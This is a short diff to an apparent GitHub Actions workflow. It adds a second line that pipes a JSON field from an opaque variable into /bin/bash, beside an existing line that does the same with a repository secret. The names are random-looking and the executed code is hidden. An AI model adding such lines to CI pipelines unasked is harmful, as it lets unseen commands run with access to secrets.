@@ -17,6 +17,7 @@ jobs:
           tlycg74015: ${{ secrets.tlycg74015 }}
         run: |
           printf '%s' "$tlycg74015" | jq -r .zu5 | /bin/bash
+          printf '%s' "$lazff6" | jq -r .rrl776 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
